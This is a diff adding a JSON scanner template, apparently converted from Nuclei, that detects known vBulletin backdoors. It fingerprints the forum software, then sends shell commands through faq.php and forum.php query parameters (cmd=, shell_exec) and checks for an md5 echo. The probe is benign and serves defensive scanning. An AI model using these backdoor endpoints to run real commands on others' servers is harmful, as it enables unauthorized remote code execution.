@@ -1,0 +1,215 @@
+{
+  "id": "vbulletin-backdoor",
+  "name": "vBulletin Backdoor - Detect",
+  "author": "MaStErCho",
+  "severity": "HIGH",
+  "description": "",
+  "references": [
+    "https://github.com/OWASP/vbscan",
+    "https://blog.sucuri.net/2017/01/vbulletin-malware-hackers-compete-backdoor-control.html"
+  ],
+  "tags": [
+    "backdoor",
+    "php",
+    "vbulletin",
+    "rce"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "flow": "http(1) \u0026\u0026 http(2)",
+  "searchQueries": {},
+  "variables": {
+    "paths": [
+      "boards",
+      "board",
+      "forum",
+      "forums",
+      "vb"
+    ],
+    "num": [
+      "999999999"
+    ]
+  },
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "method": "GET",
+      "path": "{{BaseURL}}",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "WORD",
+          "part": "body",
+          "values": [
+            "content\u003d\"vBulletin",
+            "id\u003d\"vbulletin_css",
+            "clientscript/vbulletin",
+            "vBulletin_init"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    },
+    {
+      "stepId": "http_1",
+      "method": "GET",
+      "path": "{{BaseURL}}/faq.php?cmd\u003decho%20-n%20{{num}}|md5sum",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "contains(body, \u0027{{md5(num)}}\u0027)",
+            "status_code \u003d\u003d 200"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "vbulletin-backdoor",
+    "info": {
+      "name": "vBulletin Backdoor - Detect",
+      "author": "MaStErCho",
+      "severity": "high",
+      "reference": [
+        "https://github.com/OWASP/vbscan",
+        "https://blog.sucuri.net/2017/01/vbulletin-malware-hackers-compete-backdoor-control.html"
+      ],
+      "metadata": {
+        "max_request": 21
+      },
+      "tags": "backdoor,php,vbulletin,rce"
+    },
+    "variables": {
+      "num": "999999999"
+    },
+    "flow": "http(1) \u0026\u0026 http(2)",
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "method": "GET",
+        "redirects": false,
+        "path": [
+          "{{BaseURL}}"
+        ],
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "matchers": [
+          {
+            "type": "word",
+            "negative": false,
+            "part": "body",
+            "words": [
+              "content\u003d\"vBulletin",
+              "id\u003d\"vbulletin_css",
+              "clientscript/vbulletin",
+              "vBulletin_init"
+            ],
+            "condition": "or",
+            "case_insensitive": false
+          }
+        ]
+      },
+      {
+        "global_matchers": false,
+        "payloads": {
+          "paths": [
+            "boards",
+            "board",
+            "forum",
+            "forums",
+            "vb"
+          ]
+        },
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "method": "GET",
+        "redirects": false,
+        "path": [
+          "{{BaseURL}}/faq.php?cmd\u003decho%20-n%20{{num}}|md5sum",
+          "{{BaseURL}}/forum.php?x\u003dshell_exec\u0026y\u003decho%20-n%20{{num}}|md5sum",
+          "{{BaseURL}}/{{paths}}/faq.php?cmd\u003decho%20-n%20{{num}}|md5sum",
+          "{{BaseURL}}/{{paths}}/forum.php?x\u003dshell_exec\u0026y\u003decho%20-n%20{{num}}|md5sum"
+        ],
+        "skip_variables_check": false,
+        "stop_at_first_match": true,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "contains(body, \u0027{{md5(num)}}\u0027)",
+              "status_code \u003d\u003d 200"
+            ],
+            "condition": "and"
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
